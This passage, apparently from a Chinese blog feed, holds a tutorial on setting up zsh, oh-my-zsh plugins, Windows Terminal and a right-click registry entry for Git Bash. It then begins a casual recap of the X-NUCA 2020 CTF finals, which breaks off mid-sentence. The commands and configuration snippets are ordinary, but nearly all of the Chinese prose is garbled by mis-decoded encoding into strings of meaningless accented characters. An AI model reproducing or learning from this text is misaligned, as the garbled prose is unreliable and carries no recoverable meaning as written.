ä»€ä¹ˆçš„åœ¨æµè§ˆå™¨å…ˆä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶ååœ¨ zsh é‡Œ <code>sh install.sh</code> è¿›è¡Œå®‰è£…ã€‚</p><p>ç”±äº <code>chsh</code> åœ¨ git bash é‡Œæ²¡æœ‰ï¼Œè¿™é‡Œå¯èƒ½ä¼šæŠ¥é”™ï¼Œä½†é—®é¢˜ä¸å¤§~</p><p>oh my zsh ç›¸å…³çš„æ–‡ä»¶å­˜æ”¾åœ¨ <code>~/.oh-my-zsh</code> ç›®å½•ä¸‹ã€‚</p><p>è€Œ <code>~</code> çš„ç›®å½•ä¸º <code>C:\Users\&lt;your username&gt;</code>.</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213181510130.png" alt=".oh-my-zsh"></p><blockquote><p> lib æä¾›äº†æ ¸å¿ƒåŠŸèƒ½çš„è„šæœ¬åº“<br> tools æä¾›å®‰è£…ã€å‡çº§ç­‰åŠŸèƒ½çš„å¿«æ·å·¥å…·<br> plugins è‡ªå¸¦æ’ä»¶çš„å­˜æ”¾ä½ç½®<br> templates è‡ªå¸¦æ¨¡æ¿çš„å­˜æ”¾ä½ç½®<br> themes  è‡ªå¸¦ä¸»é¢˜æ–‡ä»¶çš„å­˜æ”¾ä½ç½®<br> custom ä¸ªæ€§åŒ–é…ç½®ç›®å½•ï¼Œè‡ªå®‰è£…çš„æ’ä»¶å’Œä¸»é¢˜å¯æ”¾è¿™é‡Œ</p></blockquote><p>Oh My Zsh é»˜è®¤è‡ªå¸¦äº†ä¸€äº›é»˜è®¤ä¸»é¢˜ï¼Œå­˜æ”¾åœ¨<code>~/.oh-my-zsh/plugins</code>ç›®å½•ä¸­ï¼Œå¯ä»¥é€šè¿‡ç¼–è¾‘ <code>~/.zshrc</code> æ–‡ä»¶ä¸­çš„ <code>ZSH_THEME="robbyrussel"</code> è¿›è¡Œé…ç½®ã€‚</p><p>P.S.:  å¾ˆå¤šä¸»é¢˜éœ€è¦å…ˆå®‰è£… <em><a href="https://github.com/powerline/fonts">Powerline Fonts</a></em> æ‰èƒ½æ­£å¸¸æ¸²æŸ“å›¾æ ‡ã€‚</p><h3 id="0x03-Oh-My-Zsh-æ’ä»¶-amp-ä¸€äº›é…ç½®"><a href="#0x03-Oh-My-Zsh-æ’ä»¶-amp-ä¸€äº›é…ç½®" class="headerlink" title="0x03 Oh My Zsh æ’ä»¶ &amp; ä¸€äº›é…ç½®"></a>0x03 Oh My Zsh æ’ä»¶ &amp; ä¸€äº›é…ç½®</h3><h4 id="zsh-autosuggestions-è‡ªåŠ¨è¡¥å…¨"><a href="#zsh-autosuggestions-è‡ªåŠ¨è¡¥å…¨" class="headerlink" title="zsh-autosuggestions è‡ªåŠ¨è¡¥å…¨"></a><strong>zsh-autosuggestions</strong> è‡ªåŠ¨è¡¥å…¨</h4><p> <a href="https://github.com/zsh-users/zsh-autosuggestions">https://github.com/zsh-users/zsh-autosuggestions</a>  </p><p>å‚è€ƒ <a href="https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md#oh-my-zsh">å®˜æ–¹å®‰è£…è¯´æ˜</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions <span class="token variable">${ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom}</span>/plugins/zsh-autosuggestions</code></pre><p>ç„¶åç¼–è¾‘ <code>~/.zshrc</code>ï¼ŒåŠ å…¥æ’ä»¶ã€‚</p><p>æ³¨æ„æ˜¯ä»¥ ç©ºæ ¼ æˆ–è€… ç©ºè¡Œ ä½œä¸ºåˆ†éš”ç¬¦ã€‚</p><pre class="language-none"><code class="language-none">plugins=( [plugins...] zsh-autosuggestions)</code></pre><p>æœ€åé‡å¯ zsh å³å¯ã€‚</p><h4 id="zsh-syntax-highlighting-è¯­æ³•é«˜äº®"><a href="#zsh-syntax-highlighting-è¯­æ³•é«˜äº®" class="headerlink" title="zsh-syntax-highlighting è¯­æ³•é«˜äº®"></a><strong>zsh-syntax-highlighting</strong> è¯­æ³•é«˜äº®</h4><p> <a href="https://github.com/zsh-users/zsh-syntax-highlighting">https://github.com/zsh-users/zsh-syntax-highlighting</a></p><p>å‚è€ƒ <a href="https://github.com/zsh-users/zsh-syntax-highlighting/blob/master/INSTALL.md#oh-my-zsh">å®˜æ–¹å®‰è£…è¯´æ˜</a>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="token variable">${ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom}</span>/plugins/zsh-syntax-highlighting</code></pre><p>ç„¶åç¼–è¾‘ <code>~/.zshrc</code>ï¼ŒåŠ å…¥æ’ä»¶ã€‚</p><pre class="language-none"><code class="language-none">plugins=( [plugins...] zsh-syntax-highlighting)</code></pre><p>æœ€åé‡å¯ zsh å³å¯ã€‚</p><h4 id="ç»™historyå‘½ä»¤å¢åŠ æ—¶é—´"><a href="#ç»™historyå‘½ä»¤å¢åŠ æ—¶é—´" class="headerlink" title="ç»™historyå‘½ä»¤å¢åŠ æ—¶é—´"></a>ç»™historyå‘½ä»¤å¢åŠ æ—¶é—´</h4><p>å•Šå…¶å®è¿™ä¸ªä¸ç®—æ˜¯æ’ä»¶ï¼Œæ··å…¥çš„å–µï¼ˆ</p><p>æŠŠ <code>HIST_STAMPS</code> è¿™ä¸ªæ³¨é‡Šå»é™¤äº†å°±è¡Œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è®¾ç½®æˆä½ å–œæ¬¢çš„æ—¶é—´æ ¼å¼ã€‚</p><p>é…ç½®å¥½çš„æ•ˆæœç±»ä¼¼äºä¸‹å›¾ã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213183440438.png"></p><h4 id="æ›´æ–°-oh-my-zsh"><a href="#æ›´æ–°-oh-my-zsh" class="headerlink" title="æ›´æ–° oh-my-zsh"></a>æ›´æ–° oh-my-zsh</h4><p>é»˜è®¤çš„è¯æ˜¯æœ‰æ›´æ–°çš„æ—¶å€™ä¼šæç¤ºï¼Œé—®ä½ è¦ä¸è¦æ›´æ–°ã€‚</p><p>å¦‚æœéœ€è¦å®ƒè‡ªåŠ¨æ›´æ–°çš„è¯ï¼ŒæŠŠ <code>~/.zshrc</code> é‡Œä¸‹é¢è¿™è¡Œæ³¨é‡Šå–æ¶ˆå°±å¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">DISABLE_UPDATE_PROMPT</span><span class="token operator">=</span>true</code></pre><p>æ‰‹åŠ¨æ›´æ–°çš„è¯ï¼Œ<del>ç›´æ¥æ‰§è¡Œ<code>upgrade_oh_my_zsh</code></del>.</p><blockquote><p>Note: <code>upgrade_oh_my_zsh</code> is deprecated. Use <code>omz update</code> instead.</p></blockquote><p>å•Šç°åœ¨æ¢æˆä¸‹é¢è¿™ä¸ªäº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">omz update</code></pre><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213184825287.png" alt="upgrade"></p><h4 id="å¸è½½-oh-my-zsh"><a href="#å¸è½½-oh-my-zsh" class="headerlink" title="å¸è½½ oh-my-zsh"></a>å¸è½½ oh-my-zsh</h4><p><strong><em>ï¼ˆä¸ä¼šå§ï¼Œè¿™å°±å¸äº†ï¼Ÿ</em></strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">uninstall_oh_my_zsh</code></pre><h3 id="0x04-é…ç½®-zsh-ä¸º-bash-é»˜è®¤ç»ˆç«¯"><a href="#0x04-é…ç½®-zsh-ä¸º-bash-é»˜è®¤ç»ˆç«¯" class="headerlink" title="0x04 é…ç½® zsh ä¸º bash é»˜è®¤ç»ˆç«¯"></a>0x04 é…ç½® zsh ä¸º bash é»˜è®¤ç»ˆç«¯</h3><p>ç¼–è¾‘  <code>~/.bashrc</code>ï¼Œæˆ–è€…æ˜¯ <code>D:\Program Files\Git\etc\bash.bashrc</code>ï¼ŒåŠ å…¥ä¸‹é¢çš„å‡ è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Launch Zsh</span><span class="token keyword">if</span> <span class="token punctuation">[</span> -t <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token builtin class-name">exec</span> <span class="token function">zsh</span><span class="token keyword">fi</span></code></pre><p>è€Œåé‡å¯ git bash å³å¯è‡ªåŠ¨ä»¥ zsh å¯åŠ¨ã€‚</p><h3 id="0x05-é…ç½®-Windows-Terminal-ä½¿ç”¨-git-bash"><a href="#0x05-é…ç½®-Windows-Terminal-ä½¿ç”¨-git-bash" class="headerlink" title="0x05 é…ç½® Windows Terminal ä½¿ç”¨ git bash"></a>0x05 é…ç½® Windows Terminal ä½¿ç”¨ git bash</h3><p>å½“ç„¶é¦–å…ˆæ˜¯åœ¨ Microsoft Store é‡Œå®‰è£… Windows Terminal äº†ï¼Œè¿™é‡Œç•¥äº†ã€‚</p><p><em>ä½ çœ‹ Terminal å¤šå¥½çœ‹ï¼ˆ</em></p><p>ä½¿ç”¨å¿«æ·é”® <code>Ctrl + ,</code> æ‰“å¼€é…ç½®æ–‡ä»¶ <code>settings.json</code>ã€‚</p><p>åœ¨ <code>profiles &gt; list</code> ä¸‹æ–°å¢ä¸€ä¸ª objectï¼ŒåŠ å…¥ git bashã€‚</p><p><code>commandline</code> ä¸º git bash çš„è·¯å¾„ã€‚</p><p>ä¸ºäº†ç¡®ä¿ <code>.bash_profile</code> è¢«åŠ è½½ï¼Œéœ€è¦åœ¨ <code>commandline</code> é€‰é¡¹ä¸­åŠ å…¥ <code>-l -i</code> ã€‚</p><p><code>icon</code> å›¾æ ‡æ˜¯ä¸‹é¢è¿™ä¸ªï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ¢æˆä½ å–œæ¬¢çš„ã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/git-icon.png" alt="git-icon"></p><p>è¿™é‡Œç»™å‡ºæˆ‘çš„é…ç½®ï¼Œä¾›å‚è€ƒã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"guid"</span><span class="token operator">:</span> <span class="token string">"{1c4de342-38b7-51cf-b940-2309a097f589}"</span><span class="token punctuation">,</span>    <span class="token property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"git bash"</span><span class="token punctuation">,</span>    <span class="token property">"commandline"</span><span class="token operator">:</span> <span class="token string">"\"D:\\Program Files\\Git\\bin\\bash.exe\" -i -l"</span><span class="token punctuation">,</span>    <span class="token property">"historySize"</span><span class="token operator">:</span> <span class="token number">9001</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Bash"</span><span class="token punctuation">,</span>    <span class="token property">"closeOnExit"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"useAcrylic"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"acrylicOpacity"</span><span class="token operator">:</span> <span class="token number">0.85</span><span class="token punctuation">,</span>  <span class="token comment">//é€æ˜åº¦</span>    <span class="token property">"icon"</span><span class="token operator">:</span> <span class="token string">"D:\\tools\\my-git-bash\\git-icon.png"</span><span class="token punctuation">,</span><span class="token property">"startingDirectory"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">}</span></code></pre><h4 id="é»˜è®¤ä½¿ç”¨-git-bash-ä½œä¸º-Terminal-å¯åŠ¨"><a href="#é»˜è®¤ä½¿ç”¨-git-bash-ä½œä¸º-Terminal-å¯åŠ¨" class="headerlink" title="é»˜è®¤ä½¿ç”¨ git bash ä½œä¸º Terminal å¯åŠ¨"></a>é»˜è®¤ä½¿ç”¨ git bash ä½œä¸º Terminal å¯åŠ¨</h4><p>ä¿®æ”¹ä¸Šè¿°æ–‡ä»¶ä¸­çš„ <code>defaultProfile</code> ä¸º git bash çš„ <code>guid</code>ï¼Œæ­¤å¤„ä¸º <code>{1c4de342-38b7-51cf-b940-2309a097f589}</code>ã€‚</p><p>æ•ˆæœç±»ä¼¼äº</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token property">"defaultProfile"</span><span class="token operator">:</span> <span class="token string">"{1c4de342-38b7-51cf-b940-2309a097f589}"</span></code></pre><h3 id="0x06-å°†-Windows-Terminal-åŠ å…¥åˆ°å³é”®èœå•"><a href="#0x06-å°†-Windows-Terminal-åŠ å…¥åˆ°å³é”®èœå•" class="headerlink" title="0x06 å°† Windows Terminal åŠ å…¥åˆ°å³é”®èœå•"></a>0x06 å°† Windows Terminal åŠ å…¥åˆ°å³é”®èœå•</h3><p>é¦–å…ˆ <strong>åœ¨ cmd é‡Œ</strong> æµ‹è¯•ä¸€ä¸‹ä¸‹é¢è¿™ä¸¤ä¸ªå¸¸é‡æ˜¯å¦æ­£å¸¸ã€‚</p><pre class="language-none"><code class="language-none">echo %USERPROFILE%echo %LOCALAPPDATA%</code></pre><p>å¦‚æœæœ‰ç›¸åº”çš„ä¿¡æ¯è¾“å‡ºï¼Œåˆ™åç»­å¯ç›´æ¥ä½¿ç”¨è¿™ä¸¤ä¸ªå¸¸é‡ã€‚</p><p>å¦åˆ™éœ€è¦è¿›è¡Œå¦‚ä¸‹æ›¿æ¢ï¼š</p><pre class="language-none"><code class="language-none">%USERPROFILE% =&gt; C:\Users\&lt;username&gt;%LOCALAPPDATA% =&gt; C:\Users\&lt;username&gt;\AppData\Local</code></pre><p>å…¶ä¸­ï¼Œ<code>&lt;username&gt;</code> æ˜¯ä½ çš„ç”¨æˆ·åã€‚</p><p><strong>æ–°å»ºç›®å½•</strong></p><pre class="language-none"><code class="language-none">mkdir "%USERPROFILE%\AppData\Local\terminal"</code></pre><p>æŠŠ Windows Terminal å›¾æ ‡å¤åˆ¶åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œå›¾æ ‡æ”¾åœ¨ <a href="terminal.ico">è¿™é‡Œ</a> <code>terminal.ico</code>ã€‚</p><p>å°†å¦‚ä¸‹å†…å®¹å¦å­˜ä¸º <code>wt.reg</code>, ç„¶å<strong>ä»¥ â€œç®¡ç†å‘˜æƒé™â€ è¿è¡Œ</strong></p><pre class="language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\wt]@="Windows terminal here""Icon"="%LOCALAPPDATA%\\terminal\\terminal.ico"[HKEY_CLASSES_ROOT\Directory\Background\shell\wt\command]@="C:\\Users\\&lt;your username&gt;\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe"</code></pre><p>è¯·æ³¨æ„ï¼Œå¯¹äºæœ€åä¸€è¡Œ <code>wt.exe</code> çš„è·¯å¾„ï¼Œéœ€ä½¿ç”¨<strong>å®Œæ•´çš„ç»å¯¹è·¯å¾„</strong>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>è€ŒååŒå‡»æ‰§è¡Œï¼Œå°†é…ç½®æ·»åŠ åˆ°æ³¨å†Œè¡¨ã€‚</p><p>æ•ˆæœå°±åƒä¸‹é¢è¿™æ ·äº†ã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213192257077.png" alt="å³é”®èœå•"></p><p>ç‚¹å‡»ä¹‹åå°±èƒ½è¿›å…¥ git bashï¼Œä½¿ç”¨ zsh ç»ˆç«¯ï¼Œå¹¶ä¸”å°±åœ¨å½“å‰ç›®å½•ä¸‹äº†ã€‚</p><h3 id="0x07-ä¸€äº›-Git-Bash-é…ç½®å’Œå¿«æ·é”®"><a href="#0x07-ä¸€äº›-Git-Bash-é…ç½®å’Œå¿«æ·é”®" class="headerlink" title="0x07 ä¸€äº› Git Bash é…ç½®å’Œå¿«æ·é”®"></a>0x07 ä¸€äº› Git Bash é…ç½®å’Œå¿«æ·é”®</h3><p>å‚è€ƒ <a href="https://github.com/xnng/my-git-bash">https://github.com/xnng/my-git-bash</a></p><p>è¿™é‡Œé¢è¿˜æœ‰ä¸€äº›ç‰¹å®šé’ˆå¯¹äº git bash çš„å­—ä½“ / ä¸»é¢˜ / Tmux / wgetã€treeå®‰è£… / VSCode + git bash ç›¸å…³çš„è®¾ç½®ã€‚</p><p><strong>ä½†è¦æ³¨æ„ï¼Œæœ‰ä¸€äº›å’Œ zshã€Oh-my-zsh çš„é…ç½®ä¼šæœ‰å†²çª emmm</strong></p><p>æ‰€ä»¥ä½ å–œæ¬¢ç”¨ zsh çš„è¯ï¼Œå°±ç›´æ¥é…ç½® zsh å¥½äº†å”‰ã€‚</p><h4 id="å¸¸ç”¨çš„å¿«æ·é”®"><a href="#å¸¸ç”¨çš„å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨çš„å¿«æ·é”®"></a>å¸¸ç”¨çš„å¿«æ·é”®</h4><table><thead><tr><th>æŒ‰é”®</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>Alt + Enter</td><td>å…¨å±</td></tr><tr><td>å…³é—­çª—å£</td><td>Ctrl + Dï¼ˆéœ€å½“å‰è¡Œæ²¡æœ‰å­—ç¬¦æ‰å¯ç”¨ï¼‰</td></tr><tr><td>æ¸…å±</td><td>Ctrl + L</td></tr><tr><td>æ‰“å¼€ç»ˆç«¯</td><td>å³é”®å¿«æ·æ–¹å¼ï¼Œåœ¨å±æ€§ä¸­è‡ªè¡Œè®¾ç½®</td></tr><tr><td>å¤åˆ¶ç²˜è´´</td><td>Ctrl + Shift + C/Vï¼ˆv2.20.0 ç‰ˆæœ¬åæ‰æ”¯æŒï¼‰</td></tr></tbody></table><blockquote><p>å…¶ä»–å¿«æ·é”®éµå¾ª <code>Bash</code> æ ‡å‡†å¿«æ·é”®ï¼Œä¾‹å¦‚ <code>Ctrl + R</code> æœç´¢å†å²å‘½ä»¤ã€<code>exit</code> é€€å‡ºç»ˆç«¯ã€<code>clear</code> å’Œ <code>reset</code> æ¸…å±ã€<code>Ctrl + E/A</code> å…‰æ ‡åˆ°è¡Œé¦–å°¾ï¼Œç­‰ç­‰å¯è‡ªè¡Œæœç´¢ã€‚</p></blockquote><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åæ­£è´¼èˆ’æœå°±æ˜¯äº†ï¼</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213194048117.png"></p><p>ï¼ˆæºœäº†æºœäº†å–µ</p><hr><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><ul><li><a href="https://gist.github.com/fworks/af4c896c9de47d827d4caa6fd7154b6b">install-zsh-windows-git-bash.md</a></li><li><a href="http://i.lckiss.com/?p=6268">install zsh with git-bash on Windows10</a></li><li><a href="https://blog.csdn.net/czg13548930186/article/details/72858289/">CSDN: åˆ©ç”¨Oh-My-Zshæ‰“é€ ä½ çš„è¶…çº§ç»ˆç«¯</a></li><li><a href="https://www.jianshu.com/p/b8a80dd59414">Linux ç»ˆç«¯ç¾åŒ– - Oh My Zsh</a></li><li><a href="https://zhuanlan.zhihu.com/p/280858375">åœ¨windwos terminal ä¸­ä½¿ç”¨git bashçš„alias</a></li><li>GitHub: xnng/<strong><a href="https://github.com/xnng/my-git-bash">my-git-bash</a></strong></li><li><a href="https://cloud.tencent.com/developer/article/1652576">ä½¿ç”¨ ohmyzsh æ‰“é€  windowsã€ubuntuã€mac ç³»ç»Ÿé«˜æ•ˆç»ˆç«¯å‘½ä»¤è¡Œå·¥å…·</a>ã€‚</li><li><a href="https://www.zhihu.com/question/325948326/answer/700753639">Bä¹ï¼šæ–°å‘å¸ƒçš„Windows Terminalå¦‚ä½•æ·»åŠ åˆ°å³é”®èœå•ï¼Ÿ</a></li><li><a href="https://segmentfault.com/a/1190000015155864">win10 å®‰è£… oh my zsh å’Œ windows git bash è®¾ç½®åˆ«åæé«˜æ•ˆç‡</a></li><li><a href="https://dev.to/vsalbuq/how-to-install-oh-my-zsh-on-windows-10-home-edition-49g2">How to Install Oh My Zsh! on Windows 10 Home Edition</a></li><li>etc.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> Terminal </tag>
            
            <tag> bash </tag>
            
            <tag> zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¢ç¢å¿µ | X-NUCA 2020 å…¨å›½é«˜æ ¡ç½‘å®‰è”èµ›æ€»å†³èµ› æ·±åœ³æ¸¸è®°</title>
      <link href="2020/12/10/Life_2020XNUCA_trip/"/>
      <url>2020/12/10/Life_2020XNUCA_trip/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210144231392.png"></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©å»æ·±åœ³æ‰“äº†ä¸ª X-NUCA 2020 å…¨å›½ç½‘å®‰è”èµ›æ€»å†³èµ›ï¼Œè¶ç€è¿˜æœ‰å…´è‡´ï¼Œå°±æ¥å¤§æ¦‚æ€»ç»“ä¸€ä¸‹å§ï¼Œå–µ~</p><p>éš¾å¾—çº¿ä¸Šèµ›æŒ¤è¿›äº†å…¨å›½å‰ 20ï¼Œæœ‰æœºä¼šå»çº¿ä¸‹è§åˆ°äº†ä¸€å †å¤§è€é¼ ã€‚</p><p>æ—…æ¸¸åˆ’æ°´æ‘¸é±¼é€‰æ‰‹æ˜¯æˆ‘äº†ï¼Œå”‰ï¼Œæœç„¶å°±èººå¹³äº†ã€‚</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143327813.png" alt="å¼€å¹•å¼ç°åœº"></p><p>æœ€å¤§æ„Ÿå—å°±æ˜¯<strong>æ¯”èµ›è¿‡äºç¡¬æ ¸</strong>ï¼Œèµ›åˆ¶ç›´åˆ°å¼€å¹•å¼æ‰å…¬å¸ƒï¼Œ<strong>4é“ git based AD + 2 é“ KOHï¼Œè‚ä¸€å¤©åŠ</strong>ã€‚</p><p>å¯¹ï¼Œæ˜¯å®Œå…¨æ²¡ä½“éªŒè¿‡çš„èµ›åˆ¶ï¼Œé¢˜ç›®ç±»å‹ä»¥äºŒè¿›åˆ¶ä¸ºä¸»ï¼Œæ··æ‚ç€ pwn RE web crypto algorithmï¼Œä¸ä¼š binary çš„ misc æ‰‹æ²¡æœ‰æ¸¸æˆä½“éªŒå˜¤å˜¤å˜¤ï¼ˆ</p><p>æœç„¶æ˜¯<strong>å›½å†…ä¸ºæ•°ä¸å¤šçš„é«˜è´¨é‡æ¯”èµ›</strong>äº†ï¼Œä¹Ÿæ˜¯<strong>æ‰“è¿‡çš„æœ€ç¡¬æ ¸çš„ CTF</strong> äº†ï¼Œå¯æƒœå¯èƒ½æ²¡æœºä¼šå†æ¥ç©äº†å‘œå‘œå‘œ</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210142204833.png" alt="æ¯”èµ›ç°åœº"></p><hr><h2 id="é¢˜ç›®å›é¡¾"><a href="#é¢˜ç›®å›é¡¾" class="headerlink" title="é¢˜ç›®å›é¡¾"></a>é¢˜ç›®å›é¡¾</h2><p>git based ADï¼Œä¹‹å‰è¿˜æ²¡è§è¿‡è¿™ç§ç”¨ git ç»´æŒæ¯”èµ›ç¯å¢ƒçš„ï¼Œå°±æ˜¯ä¸»åŠæ–¹æ­äº†ä¸ª GitLabï¼Œç»™å„é˜Ÿåˆ†é…äº†ç”¨æˆ·åå¯†ç ä»¥åŠä»“åº“ï¼Œä¸åŒé¢˜ç›®æ”¾åœ¨ä¸åŒçš„åˆ†æ”¯ã€‚</p><p>ä¿®å¤æ¼æ´éœ€è¦æŠŠ patch æ–‡ä»¶ push ä¸Šå»ï¼Œå¦‚æœ check é€šè¿‡äº†è¯ï¼Œåˆ™æ¨é€åˆ°å›¢é˜Ÿè‡ªå·±çš„ gamebox é‡Œã€‚äºæ˜¯ä¹å¼€å¹•å¼è¿˜å»å¤ä¹ äº†ä¸€æ³¢ git æ“ä½œï¼Œå”‰è¿˜æ˜¯å¤ªèœäº†ã€‚</p><p>ä¸è¿‡è¿™å€’æ˜¯æœ‰ä¸ªå¥½å¤„ï¼Œé¢˜ç›®ä¸å®¹æ˜“è¢«åˆ«äººæ…ä¹±ï¼Œå½“ç„¶å•¥æµé‡ä¹ŸæŠ“ä¸åˆ°äº†å˜¤å˜¤å˜¤ã€‚</p><p>å¦å¤–å‘¢è¿˜å¼•å…¥äº† NPC é¢˜ï¼Œå°±æ˜¯åªèƒ½æ‰“ä¸èƒ½é˜²ï¼Œåæ­£æ„Ÿè§‰å°±ç±»ä¼¼äºå¹³å¸¸è§£é¢˜èµ›é‡Œçš„é¢˜å‹äº†ã€‚</p><p>ï¼ˆæ¯”èµ›æœŸé—´æ‰çŸ¥é“åŸæ¥åªæœ‰ pwn é¢˜æ˜¯æ”»é˜²ç»“åˆçš„ï¼Œweb æ˜¯ NPCï¼Œå®³</p><p>KOH é¢˜å‹ä¹ŸæŒºæœ‰æ„æ€çš„ï¼Œ<em>King Of the Hill</em>ï¼Œå°±æ˜¯å®Œæˆé¢˜ç›®ä»£ç æ‰€ç»™çš„ä¸€ä¸ªä»»åŠ¡ï¼Œé€šè¿‡ git push çš„æ–¹å¼æŠŠä»£ç æˆ–è€…æ•°æ®ä¼ ä¸Šå»ï¼Œè€Œååå°çš„ OJ è¿›è¡Œè¯„æµ‹æ‰“åˆ†ï¼ŒæŒ‰ç…§è¿™ä¸ªæ‰“åˆ†çš„æ’åè¿›è¡Œæ’åºï¼ŒæŠ˜åˆæˆæœ€åçš„æ€»åˆ†ã€‚</p><p>ä¹ä¸€çœ‹è¿˜ä»¥ä¸ºæ˜¯ OI é‡Œçš„å•¥ç®—æ³•é¢˜ï¼Œä¸€è„¸æ‡µé€¼ï¼Œä¸è¿‡ç¡®å®æŒºåƒçš„ï¼Œéƒ½æ²¡ç©è¿‡å°±æ˜¯äº†ã€‚åˆ°æœ€åè¿™é¢˜ç›®è€å†…å·äº†ï¼Œæœç„¶å¦‚å…¶å King Of the Hill äº†ã€‚</p><p>ä¸‹é¢æ˜¯<strong>ç¡¬æ ¸ç¯èŠ‚</strong>ï¼Œæ¥ç®€å•çœ‹çœ‹é¢˜ç›®æ€ä¹ˆç¡¬æ ¸çš„å§ï¼ˆqs</p><ul><li>æ¯”å¦‚ç»™äº†ä¸€å¥—æœ€æ–°ç‰ˆçš„ WordPress å’Œä¸€å †æ’ä»¶ é­”æ”¹åçš„æºç  &amp; dump å‡ºæ¥çš„ sql æ–‡ä»¶ï¼Œå»æŒ–æ´æ‰¾ flag<br>ï¼ˆç„¶è€Œ diff äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œåœ¨æœ¬åœ°æ­äº†ä¸€æ™šä¸Š PHP ç¯å¢ƒç„¶è€Œ php-mysql çš„æ’ä»¶è£…ä¸ä¸Šäºæ˜¯è·‘ä¸èµ·æ¥ï¼Œå¿ƒæ€å´©äº†</li><li>æ¯”å¦‚æŒ–ä¸€ä¸ªæ‰‹å†™çš„ Cè¯­è¨€ç¼–è¯‘å™¨ é‡Œçš„æ´<br>ï¼ˆé˜Ÿå‹è¡¥äº†æ´å‘ç°è¿˜æ˜¯ä¸€ç›´è¢«æ‰“ï¼Œè¿˜åŠ¨ä¸åŠ¨ check down patch ä¸ä¸Šå»ï¼Œæœ€åå‡ºé¢˜äººè¯´æœ‰8ä¸ªæ´ï¼Œäººéƒ½å‚»äº†</li><li>æ¯”å¦‚ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘å‡ºæ¥æ··æ‚ç€ AES RSA å¯†ç å­¦æ±‚è§£<br>ï¼ˆè¦æ˜¯ç›´æ¥ç»™ crypto å¯èƒ½è¿˜èƒ½çœ‹çœ‹å˜¤å˜¤å˜¤</li><li>æ¯”å¦‚ä¸€ä¸ª mips æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘å‡ºæ¥å†™äº†ä¸ª web æœåŠ¡ï¼ŒGET POST DELETE ç­‰ç­‰ä¸åŒæ–¹æ³•æ‰§è¡Œä¸åŒæŒ‡ä»¤ï¼Œæ¶‰åŠå †æ“ä½œå•¥çš„<br>ï¼ˆå•¥ç©æ„å•Šï¼ŒåŠé€€äº†</li><li>æ¯”å¦‚ KOH ç»™äº†ä¸€ä¸ª é¢å‘å¯¹è±¡çš„ cppï¼Œçœ‹äº†è´¼ä¹…æ‰çŸ¥é“å¤§æ¦‚æ˜¯ä¸ª driver å¼€è½¦è½¦çš„ç®—æ³•æ¨¡æ‹Ÿï¼Œè¾“å…¥ä¸¤ä¸ªçŸ©é˜µä¸€ä¸ª noiseï¼Œç»“åˆéšæœºæ•°ç»è¿‡ä¸€ç³»åˆ—è¿ç®—ä¹‹åå¦‚æœåœ¨ç»™å®šæœ€å¤§æ—¶é—´å†…å’Œç›®æ 